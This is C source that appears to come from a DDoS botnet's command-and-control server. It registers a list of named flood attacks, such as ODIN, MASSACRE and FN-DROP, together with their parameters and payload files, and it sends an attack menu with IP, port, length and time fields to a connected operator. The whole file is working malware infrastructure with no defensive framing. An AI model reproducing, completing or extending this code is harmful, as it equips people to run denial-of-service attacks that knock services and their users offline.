#include <arpa/inet.h>
#include <sys/socket.h>

#include "config.h"
#include "attacks.h"
#include "commands.h"

void cnc_add_attack(char *name, char *_atk, int port, int len, char *data, char *extradata)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) == 0)
		{
			strcpy(atk[i].name, name);
			strcpy(atk[i].type, _atk);
			strcpy(atk[i].data, data);
			strcpy(atk[i].extradata, extradata);
			atk[i].port = port;
			atk[i].len = len;
			break;
		}
	}
}

void cnc_display_attacks(const int fd)
{
	char _atk[100];
	int i, len = 0, ii;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) > 0)
		{
			strcpy(_atk, atk[i].name);
			for(ii = 0; ii < 10 - strlen(atk[i].name); ii++)
				strcat(_atk, ".");
			strcat(_atk, ": ");
			send(fd, "║ ", 2, MSG_NOSIGNAL);
			send(fd, _atk, strlen(_atk), MSG_NOSIGNAL);

			send(fd, " [IP]", strlen(" [IP]"), MSG_NOSIGNAL);
			if(atk[i].port == 1)
				send(fd, " [PORT]", strlen(" [PORT]"), MSG_NOSIGNAL);
			if(atk[i].len == 1)
				send(fd, " [LEN]", strlen(" [LEN]"), MSG_NOSIGNAL);
			send(fd, " [TIME]", strlen(" [TIME]"), MSG_NOSIGNAL);
			send(fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
		}
	}
}

void cnc_add_attacks(void)
{
	cnc_add_attack("ODIN", "odin", 1, 0, "odin.txt 4 -1", "");
	cnc_add_attack("GUNTHER", "gunther", 1, 0, "gunther.txt 4 -1", "");
	cnc_add_attack("PHOENIX", "phoenix", 1, 0, "4 -1", "1");
	cnc_add_attack("KRATOS", "kratos", 1, 0, "kratos.txt 4 -1", "");
	cnc_add_attack("OSIRIS", "osiris", 1, 0, "osiris.txt 4 -1", "");
	cnc_add_attack("MASSACRE", "massacre", 0, 0, "1 -1", "");
	cnc_add_attack("ETHERA", "ethera", 0, 0, "", "8");
	cnc_add_attack("HOME", "home", 1, 0, "", "");
	cnc_add_attack("FN-DROP", "fn-drop", 1, 0, "fn-drop.txt", "88");
	cnc_add_attack("R6-DROP", "r6-drop", 0, 0, "r6-drop.txt 40", "");
	cnc_add_attack("ERIS", "eris", 1, 0, "", "8");
	cnc_add_attack("ARK-DROP", "ark-drop", 1, 0, "8", "");
	cnc_add_attack("ORYX", "oryx", 1, 0, "600 4 -1", "");
	//cnc_add_attack("ANUBIS", "anubis", 1, 0, "", "");
}
